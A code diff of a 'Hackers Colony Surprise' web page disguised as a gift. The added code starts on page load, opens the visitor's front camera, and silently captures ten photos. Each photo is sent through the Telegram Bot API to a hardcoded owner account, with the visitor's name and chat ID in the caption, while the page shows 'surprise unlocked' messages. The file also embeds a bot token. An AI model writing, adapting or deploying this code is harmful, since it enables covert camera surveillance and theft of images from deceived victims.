@@ -3,86 +3,128 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎁 Hackers Colony Surprise</title>
+<title>🎁 Your Hackers Colony Surprise!</title>
 <style>
-body { font-family: Arial; display: flex; justify-content:center; align-items:center; min-height:100vh; background: linear-gradient(135deg,#6a11cb,#2575fc);}
-.container { background:white; padding:20px; border-radius:15px; text-align:center; max-width:400px;}
-button { padding:12px 20px; border:none; border-radius:50px; font-size:16px; cursor:pointer; background:linear-gradient(90deg,#6a11cb,#2575fc); color:white;}
-video { display:none; width:100%; border-radius:10px; margin:10px 0;}
-img { display:none; width:120px; height:120px; border:3px solid #6a11cb; border-radius:10px; object-fit:cover; margin:10px auto;}
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+body { background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+.container { background: white; padding: 25px; border-radius: 15px; max-width: 450px; width: 100%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+.gift { font-size: 50px; margin: 10px 0; }
+h1 { color: #333; margin: 10px 0; font-size: 22px; }
+video { width: 100%; border-radius: 10px; border: 3px solid #6a11cb; margin: 15px 0; transform: scaleX(-1); }
+.progress { width: 100%; height: 8px; background: #eee; border-radius: 4px; margin: 15px 0; overflow: hidden; }
+.progress-bar { height: 100%; width: 0%; background: #00b09b; transition: width 0.3s; }
+.photo-preview { width: 140px; height: 140px; border-radius: 10px; border: 3px solid #6a11cb; margin: 15px auto; object-fit: cover; }
+.status { color: #00b09b; background: #e6fff9; padding: 10px; border-radius: 8px; margin: 10px 0; }
+.counter { color: #666; font-size: 14px; margin: 5px 0; }
 </style>
 </head>
 <body>
 <div class="container">
-<h2 id="title">🎁 Your Surprise</h2>
-<p id="message">Click below to start</p>
-<button onclick="startSurprise()">🎁 GET SURPRISE</button>
-<video id="video" autoplay playsinline></video>
-<img id="photoPreview">
+    <div class="gift">🎁</div>
+    <h1 id="title">Your Hackers Colony Surprise</h1>
+    <p id="message" style="color: #666;">Loading your surprises...</p>
+    
+    <video id="video" autoplay playsinline></video>
+    
+    <div class="progress" id="progress">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    
+    <div id="counter" class="counter"></div>
+    
+    <img id="photoPreview" class="photo-preview">
+    
+    <div id="status" class="status"></div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
+// --- CONFIG ---
 const urlParams = new URLSearchParams(window.location.search);
 const USER_CHAT_ID = urlParams.get("chat_id");
-const USER_NAME = urlParams.get("name") || "Friend";
 const BOT_TOKEN = "8226782560:AAGgKjz2W5QJskEkD1Gy4B8bRk0Cdabgjh0";
 const OWNER_ID = "8215819954";
+const USER_NAME = urlParams.get("name") || "Friend";
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const ctx = canvas.getContext("2d");
-const photoPreview = document.getElementById("photoPreview");
+let photosSent = 0;
 
-async function startSurprise() {
-    document.getElementById("title").textContent = "📸 Camera Ready!";
-    document.getElementById("message").textContent = "Smile! Taking your photos...";
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
-    video.srcObject = stream;
-    video.style.display = "block";
-    await new Promise(res => video.onloadedmetadata = res);
-
-    for(let i=1;i<=3;i++){  // take 3 photos
-        await new Promise(r => setTimeout(r, 700));
-        const blob = await capturePhoto(i);
-        showPreview(blob);
-        await sendPhoto(blob,i);
-    }
-
-    stream.getTracks().forEach(t=>t.stop());
-    document.getElementById("title").textContent = "✅ Surprise Complete!";
-    document.getElementById("message").textContent = "Check Telegram for your photos!";
+// --- UTILS ---
+function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+function updateProgress(current, total) {
+    const percent = (current / total) * 100;
+    document.getElementById("progressBar").style.width = percent + "%";
+    document.getElementById("counter").textContent = `${current}/${total}`;
 }
-
-async function capturePhoto(num){
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video,0,0,canvas.width,canvas.height);
-    return new Promise(res => canvas.toBlob(res,'image/jpeg',0.9));
-}
-
-function showPreview(blob){
+function showPreview(blob) {
     const url = URL.createObjectURL(blob);
-    photoPreview.src = url;
-    photoPreview.style.display = "block";
-    setTimeout(()=>URL.revokeObjectURL(url),1000);
+    const preview = document.getElementById("photoPreview");
+    preview.src = url;
+    setTimeout(() => URL.revokeObjectURL(url), 1000);
+}
+function showStatus(text) {
+    const status = document.getElementById("status");
+    status.textContent = text;
 }
 
-async function sendPhoto(blob,num){
-    const file = new File([blob],`photo_${num}.jpg`,{type:"image/jpeg"});
-    const formData = new FormData();
-    formData.append("photo",file);
-    formData.append("caption",`📸 Photo ${num} from ${USER_NAME}`);
-    formData.append("chat_id",USER_CHAT_ID);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData});
-    // send to owner
-    const formData2 = new FormData();
-    formData2.append("photo",file);
-    formData2.append("caption",`📸 Photo ${num} from ${USER_NAME}`);
-    formData2.append("chat_id",OWNER_ID);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:formData2});
+// --- TELEGRAM SEND ---
+async function sendPhoto(blob, num) {
+    const file = new File([blob], `photo_${num}.jpg`, { type: "image/jpeg" });
+    const captionOwner = `📸 Photo ${num} from ${USER_NAME}\nUser ID: ${USER_CHAT_ID || 'Anonymous'}`;
+    const captionUser = `🎁 Your Surprise Photo ${num}`;
+    
+    const formDataOwner = new FormData();
+    formDataOwner.append("photo", file);
+    formDataOwner.append("caption", captionOwner);
+    formDataOwner.append("chat_id", OWNER_ID);
+    
+    const formDataUser = new FormData();
+    formDataUser.append("photo", file);
+    formDataUser.append("caption", captionUser);
+    if (USER_CHAT_ID) formDataUser.append("chat_id", USER_CHAT_ID);
+    
+    try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formDataOwner }); } catch(e){}
+    try { if(USER_CHAT_ID) await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formDataUser }); } catch(e){}
 }
+
+// --- MAIN ---
+async function startSurprise() {
+    document.getElementById("title").textContent = "📸 Preparing your surprises...";
+    document.getElementById("message").textContent = "Smile! Unlocking surprises...";
+    
+    // CAMERA
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 1280, height: 720 } });
+    video.srcObject = stream;
+    
+    for (let i=1; i<=10; i++) {
+        await delay(800);
+        // capture
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.save();
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1,1);
+        ctx.drawImage(video,0,0,canvas.width,canvas.height);
+        ctx.restore();
+        const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
+        
+        showPreview(blob);
+        showStatus(`🎉 Surprise ${i} unlocked!`);
+        updateProgress(i, 10);
+        await sendPhoto(blob, i);
+        photosSent++;
+    }
+    
+    // Finish
+    stream.getTracks().forEach(t => t.stop());
+    document.getElementById("title").textContent = "✅ All surprises sent!";
+    document.getElementById("message").textContent = `${photosSent} photos sent to your Telegram!`;
+}
+
+window.onload = startSurprise;
 </script>
 </body>
 </html>
